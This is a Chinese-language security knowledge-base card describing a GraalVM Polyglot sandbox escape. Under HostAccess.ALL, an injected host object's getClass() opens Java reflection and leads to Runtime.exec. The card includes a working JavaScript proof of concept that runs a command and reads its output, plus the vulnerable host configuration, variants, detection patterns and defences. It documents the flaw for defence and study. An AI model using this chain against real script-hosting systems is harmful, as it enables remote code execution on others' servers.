---
id: binary-pwn-sandbox-escape-graalvm-hostaccess-all-getclass-rce
title: GraalVM HostAccess.ALL 下 getClass 反射逃逸到宿主 Runtime.exec
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: graalvm-hostaccess-reflection-escape
tags:
- graalvm
- polyglot
- sandbox-escape
- javascript
- java
- reflection
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-05'
verification:
  verified_by: verifier-V6
  verified_at: '2026-11-05T00:54:37+08:00'
  notes: 已对照原文与20张图核对：HostAccess.ALL 下 getClass 可见、getClassLoader→loadClass('java.lang.Runtime')→getMethod('getRuntime').invoke(null)→exec(String)、BufferedReader 读输出，图16/19/20 实测输出 uid/gid 并返回 ESCAPE_SUCCESSFUL/RCE_SUCCESS，均与卡片一致。环境为 GraalVM CE 21.0.2 + polyglot 24.1.1（实验环境，非受影响版本区间），未设versions。未验证点：未在本机复现。
url: /docs/binary/pwn/sandbox-escape/binary-pwn-sandbox-escape-graalvm-hostaccess-all-getclass-rce/
draft: false
kb_aliases:
- GraalVM Polyglot 沙箱逃逸
- HostAccess.ALL 逃逸
- getClass 反射 RCE
- GraalJS 沙箱绕过
- allowCreateProcess false 绕过
---

## 一句话结论

GraalVM Polyglot Context 只要使用 `HostAccess.ALL`，即使关闭了 `allowHostClassLookup`、`allowIO`、`allowCreateProcess`、`allowNativeAccess`，脚本仍可通过注入对象的 `getClass()` 进入 Java 反射 API，加载 `Runtime` 并执行系统命令。

## 原理

- Polyglot Context 的 `allow*` 配置只约束语言引擎层（如 JS 的 `Java.type`、IO、进程创建等）；注入到脚本的宿主 Java 对象仍按 `HostAccess` 策略暴露成员。
- `HostAccess.ALL` 会暴露对象的全部 public 成员，包括继承自 `java.lang.Object` 的 `getClass()`、`hashCode()`、`toString()`。`getClass()` 返回 `Class` 对象，是 Java 反射的入口。
- 拿到 `Class` 后，可通过 `getClassLoader()` 得到 `ClassLoader`，再用实例方法 `loadClass('java.lang.Runtime')` 加载任意类。`Class.forName` 是静态方法，可能因 interop 调用方式受限；`ClassLoader.loadClass` 是实例方法，可正常调用。
- 之后用 `getMethod('getRuntime').invoke(null)` 取得 Runtime 单例，再反射调用 `exec(String)`。这条路径完全在 JVM 反射层执行，不经过 GraalJS 的 `allowHostClassLookup`/`allowCreateProcess` 检查。
- 读取命令输出同样用反射：`Process.getInputStream()` → `InputStreamReader` → `BufferedReader.readLine()`，从而绕过 `allowIO(false)`。
- 漏洞根因不是某一个 `allow*` 开关，而是 `HostAccess.ALL` 把 `getClass()` 暴露给了不可信脚本，使 Context 级限制失去意义。

## 触发条件

- 宿主应用使用 GraalVM Polyglot 执行用户可控脚本（规则引擎、低代码、插件、多租户 FaaS 等）。
- Context 使用 `HostAccess.ALL`，且向脚本注入了任意宿主对象（`putMember`）。
- 脚本有权限访问注入对象；`allowHostClassLookup` 为 false 也不影响本链。

## 利用步骤

1. 在脚本中枚举全局对象，确认注入对象（如 `scriptHelper`）可达；`Object.getOwnPropertyNames(globalThis)` 可发现它。
2. 调用 `scriptHelper.getClass()` 获取 `Class`；在 `HostAccess.ALL` 下它返回函数而不是 `undefined`。
3. `getClass().getClassLoader().loadClass('java.lang.Runtime')` 加载 Runtime。
4. 反射获取 `getRuntime` 并 `invoke(null)` 得到单例；再反射获取 `exec(String)` 并传入命令。
5. 通过 `Process.getInputStream()` 包装 `BufferedReader` 读取输出。

## PoC

最小验证片段：

```javascript
var clazz = scriptHelper.getClass();
var cl = clazz.getClassLoader();
var rtClass = cl.loadClass('java.lang.Runtime');
var rt = rtClass.getMethod('getRuntime').invoke(null);
var proc = rtClass.getMethod('exec', cl.loadClass('java.lang.String')).invoke(rt, 'id');

var br = cl.loadClass('java.io.BufferedReader')
  .getConstructor(cl.loadClass('java.io.Reader'))
  .newInstance(
    cl.loadClass('java.io.InputStreamReader')
      .getConstructor(cl.loadClass('java.io.InputStream'))
      .newInstance(
        cl.loadClass('java.lang.Process')
          .getMethod('getInputStream').invoke(proc)
      )
  );
var line, out = '';
while ((line = br.getClass().getMethod('readLine').invoke(br)) !== null) out += line + '\n';
scriptHelper.log(out);
```

对应宿主配置（漏洞形态）：

```java
Context ctx = Context.newBuilder("js")
    .allowHostAccess(HostAccess.ALL)      // 根因
    .allowHostClassLookup(s -> false)
    .allowIO(false)
    .allowCreateProcess(false)
    .allowNativeAccess(false)
    .build();
```

## 变体与关联

- 变体：用 `ClassLoader.loadClass` 替代 `Class.forName`；用 `ProcessBuilder` 替代 `Runtime.exec`；通过 `getDeclaredMethod`/`setAccessible` 访问非 public 成员；反射读取 `System.getProperties()`、环境变量或文件。
- 关联：[[binary-pwn-sandbox-escape-groovy-invokerhelper-indirect-dispatch]]（同为 JVM 语言沙箱的间接调用逃逸）；[[binary-pwn-sandbox-escape-groovy-reflection-blacklist-gaps]]（反射/黑名单盲区）；[[binary-pwn-sandbox-escape-graalvm-explicit-info-leak]]（EXPLICIT 下的信息泄露面）。
- 边界：若使用 `HostAccess.EXPLICIT`/`SCOPED` 或自定义策略禁止 public 访问与集合访问，`getClass()` 不可见，本链中断；原文在 GraalVM CE 21.0.2 + polyglot 24.1.1 环境验证。

## 检测与防御

- 检测：用户脚本中出现 `getClass`、`getClassLoader`、`loadClass`、`getRuntime`、`ProcessBuilder`、`getInputStream` 等反射链特征；脚本执行后出现异常子进程；Context 配置为 `HostAccess.ALL`。
- 防御：不要对不可信脚本使用 `HostAccess.ALL`；使用 `HostAccess.SCOPED` 或自定义策略（`allowPublicAccess(false)`、禁止集合/数组/Map 访问、`methodScoping(true)`）；使用 `SandboxPolicy.UNTRUSTED`（GraalVM 23.0+）；只向脚本暴露基本类型/String，避免返回宿主对象；将脚本执行放入独立进程/容器做二次隔离。
